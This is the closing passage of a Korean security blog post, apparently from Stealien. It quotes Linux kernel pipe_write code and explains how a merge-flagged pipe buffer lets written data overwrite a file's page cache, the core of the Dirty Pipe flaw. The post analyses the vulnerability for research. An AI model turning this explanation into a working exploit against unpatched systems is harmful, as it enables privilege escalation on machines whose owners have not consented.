	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span> <span class="o">=</span> <span class="n">iocb</span><span class="o">-&gt;</span><span class="n">ki_filp</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">pipe</span> <span class="o">=</span> <span class="n">filp</span><span class="o">-&gt;</span><span class="n">private_data</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">head</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">size_t</span> <span class="n">total_len</span> <span class="o">=</span> <span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">);</span>
	<span class="kt">ssize_t</span> <span class="n">chars</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">was_empty</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
	<span class="n">bool</span> <span class="n">wake_next_writer</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

	<span class="p">...</span>

	<span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
	<span class="n">was_empty</span> <span class="o">=</span> <span class="n">pipe_empty</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">);</span>
	<span class="n">chars</span> <span class="o">=</span> <span class="n">total_len</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">PAGE_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">chars</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">was_empty</span><span class="p">)</span> <span class="p">{</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
		<span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[(</span><span class="n">head</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>
		<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">+</span> <span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">;</span>

		<span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
		    <span class="n">offset</span> <span class="o">+</span> <span class="n">chars</span> <span class="o">&lt;=</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="n">pipe_buf_confirm</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

			<span class="n">ret</span> <span class="o">=</span> <span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">chars</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="n">chars</span><span class="p">))</span> <span class="p">{</span>
				<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">))</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>최종적으로 pipe_write 함수를 호출하면, buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE를 통과하고 copy_page_from_iter 함수 호출과 함께 buf→page에 있는 page cache가 우리의 데이터로 덮히게 된다. 다시 똑같은 파일을 읽게 된다면, 우리가 수정한 내용이 담겨있는 page cache를 읽게된다.</p>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/stealien_inverse.png" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">seonungjang</div>
                <div class="page-profile-email">sujang@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Hyerim Jeon</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2023-11-15/Android-malware-%EC%82%AC%EB%A7%88%EA%B7%80-%ED%95%B4%EB%B6%80%ED%95%99-ko">
            <div class="post-title">
                Android Malware : 사마귀 해부학
            </div>
        </a>
        <div class="post-summary">about Roaming Mantis</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Hyerim Jeon
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Nov 15, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/stealien_inverse.png" class="profile_image" />
            <div class="profile_author">Donggyu Kim</div>
        </div>
    </div>
    <div class="col">
        <a href="/id/2023-07-31/bughunting-vulnerability-chaining-ko">
            <div class="post-title">
                버그헌팅: 취약점 체이닝의 중요성
            </div>
        </a>
        <div class="post-summary">No impact, No bug</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                Donggyu Kim
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Jul 31, 2023
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>
		</div>
	</section><footer>
  <div class="container" style="display: flex; justify-content: space-between;">
    <!-- <a href="#top">
      <img src="/assets/white_logo.png" class="footer-logo" />
    </a> -->
    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
    <div class="footer-icons">
      <a target="_blank" href="https://twitter.com/stealien"><img class="sns" src="/assets/icons/twitter_ic.png"/></a>
      <a target="_blank" href="https://blog.naver.com/stealien_official"><img class="sns" src="/assets/icons/blog_ic.png"/></a>
      <a target="_blank" href="https://www.facebook.com/stealien/"><img class="sns" src="/assets/icons/facebook_ic.png"/></a>
      <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img class="sns" src="/assets/icons/youtube_ic.png"/></a>
    </div>
  </div>
</footer></body>
</html>
